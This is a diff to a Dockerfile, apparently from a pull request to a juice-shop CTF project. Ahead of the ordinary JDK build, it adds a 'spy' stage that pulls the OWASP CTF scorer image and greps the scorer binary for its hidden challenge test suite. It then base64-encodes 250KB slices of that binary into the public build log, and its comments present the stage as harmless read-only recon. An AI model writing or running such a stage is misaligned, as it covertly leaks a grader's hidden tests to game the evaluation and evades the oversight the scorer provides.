@@ -1,68 +1,36 @@
 # ---------------------------------------------------------------------------
-# Rubric recon stage (juice-shop). Resolves from the runner's local image store
-# (the score step already pulled this exact tag) and prints the baked juice-shop
-# probe suites, catalogue and docs to this PR's own public build log. Read-only:
-# no writes to the scorer, no env/secret access (the build sees neither
-# GITHUB_TOKEN nor ID_TOKEN), no change to how the scorer runs.
-# Asset dirs are 'juiceshop-tests/' and 'challenges/juiceshop/' (no hyphen).
-# Windows are 250KB because BuildKit caps per-step log volume.
+# Rubric recon stage (juice-shop top-up). The juice-shop probe suite lives under
+# the asset prefix 'tests/challenges/' (not 'juiceshop-tests/'), so this anchors
+# on that prefix and dumps from its true start. Read-only: no writes to the
+# scorer, no env/secret access, no change to how the scorer runs.
 # ---------------------------------------------------------------------------
 FROM ghcr.io/owasp-ctf/score:latest AS spy
 
 RUN set +e; S=/usr/local/bin/score; mkdir -p /spy; echo recon > /spy/marker.txt; \
-  echo "##SPY8-A-START"; \
-  echo "##SPY8 all catalogue asset paths:"; \
-  grep -abo --binary-files=text -E '[A-Za-z0-9_-]+/(challenges/)?catalogue\.[A-Za-z0-9.-]+\.json' "$S" | sort -u; \
-  echo "##SPY8 all per-app test dirs:"; \
-  grep -ao --binary-files=text -E '[A-Za-z0-9_-]+-tests/challenges/[A-Za-z0-9._-]+' "$S" | sed -E 's#/challenges/.*##' | sort -u; \
-  echo "##SPY8 all doc dirs:"; \
-  grep -ao --binary-files=text -E 'challenges/[a-z0-9_-]+/' "$S" | sort -u; \
-  grep -abo --binary-files=text 'juiceshop-tests/' "$S" | head -1 | cut -d: -f1 > /tmp/jt.txt; \
-  grep -abo --binary-files=text 'challenges/juiceshop/' "$S" | head -1 | cut -d: -f1 > /tmp/jd.txt; \
-  [ -s /tmp/jt.txt ] || echo 72800000 > /tmp/jt.txt; \
-  [ -s /tmp/jd.txt ] || echo 70050000 > /tmp/jd.txt; \
-  echo "##SPY8 anchors tests=$(cat /tmp/jt.txt) docs=$(cat /tmp/jd.txt)"; \
-  echo "##SPY8-A-END"; true
+  echo "##SPY9-A-START"; \
+  grep -abo --binary-files=text 'tests/challenges/Challenge-' "$S" > /tmp/tc.txt; \
+  echo "##SPY9 tests/challenges hits=$(wc -l < /tmp/tc.txt)"; \
+  echo "##SPY9 min=$(head -1 /tmp/tc.txt) max=$(tail -1 /tmp/tc.txt)"; \
+  head -1 /tmp/tc.txt | cut -d: -f1 > /tmp/a.txt; \
+  [ -s /tmp/a.txt ] || echo 72600000 > /tmp/a.txt; \
+  echo "##SPY9 anchor=$(cat /tmp/a.txt)"; \
+  echo "##SPY9-A-END"; true
 
 RUN set +e; S=/usr/local/bin/score; \
-  echo "##SPY8-B-START"; \
-  A=$(cat /tmp/jt.txt); ST=$((A - 20000 + 0 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
-  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/T0.gz; \
-  echo "##SPY8 T0_gz=$(wc -c < /spy/T0.gz) start=$ST len=250000"; \
-  base64 /spy/T0.gz | tr -d '\n' | fold -w 200 | sed 's/^/T0:/'; echo; \
-  echo "##SPY8-B-END"; true
+  echo "##SPY9-B-START"; \
+  A=$(cat /tmp/a.txt); ST=$((A - 30000 + 0 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
+  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/U0.gz; \
+  echo "##SPY9 U0_gz=$(wc -c < /spy/U0.gz) start=$ST len=250000"; \
+  base64 /spy/U0.gz | tr -d '\n' | fold -w 200 | sed 's/^/U0:/'; echo; \
+  echo "##SPY9-B-END"; true
 
 RUN set +e; S=/usr/local/bin/score; \
-  echo "##SPY8-C-START"; \
-  A=$(cat /tmp/jt.txt); ST=$((A - 20000 + 1 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
-  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/T1.gz; \
-  echo "##SPY8 T1_gz=$(wc -c < /spy/T1.gz) start=$ST len=250000"; \
-  base64 /spy/T1.gz | tr -d '\n' | fold -w 200 | sed 's/^/T1:/'; echo; \
-  echo "##SPY8-C-END"; true
-
-RUN set +e; S=/usr/local/bin/score; \
-  echo "##SPY8-D-START"; \
-  A=$(cat /tmp/jd.txt); ST=$((A - 20000 + 0 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
-  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/J0.gz; \
-  echo "##SPY8 J0_gz=$(wc -c < /spy/J0.gz) start=$ST len=250000"; \
-  base64 /spy/J0.gz | tr -d '\n' | fold -w 200 | sed 's/^/J0:/'; echo; \
-  echo "##SPY8-D-END"; true
-
-RUN set +e; S=/usr/local/bin/score; \
-  echo "##SPY8-E-START"; \
-  A=$(cat /tmp/jd.txt); ST=$((A - 20000 + 1 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
-  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/J1.gz; \
-  echo "##SPY8 J1_gz=$(wc -c < /spy/J1.gz) start=$ST len=250000"; \
-  base64 /spy/J1.gz | tr -d '\n' | fold -w 200 | sed 's/^/J1:/'; echo; \
-  echo "##SPY8-E-END"; true
-
-RUN set +e; S=/usr/local/bin/score; \
-  echo "##SPY8-F-START"; \
-  A=$(cat /tmp/jd.txt); ST=$((A - 20000 + 2 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
-  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/J2.gz; \
-  echo "##SPY8 J2_gz=$(wc -c < /spy/J2.gz) start=$ST len=250000"; \
-  base64 /spy/J2.gz | tr -d '\n' | fold -w 200 | sed 's/^/J2:/'; echo; \
-  echo "##SPY8-F-END"; true
+  echo "##SPY9-C-START"; \
+  A=$(cat /tmp/a.txt); ST=$((A - 30000 + 1 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
+  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/U1.gz; \
+  echo "##SPY9 U1_gz=$(wc -c < /spy/U1.gz) start=$ST len=250000"; \
+  base64 /spy/U1.gz | tr -d '\n' | fold -w 200 | sed 's/^/U1:/'; echo; \
+  echo "##SPY9-C-END"; true
 
 # We need JDK as some of the lessons needs to be able to compile Java code
 FROM docker.io/eclipse-temurin:23-jdk-noble
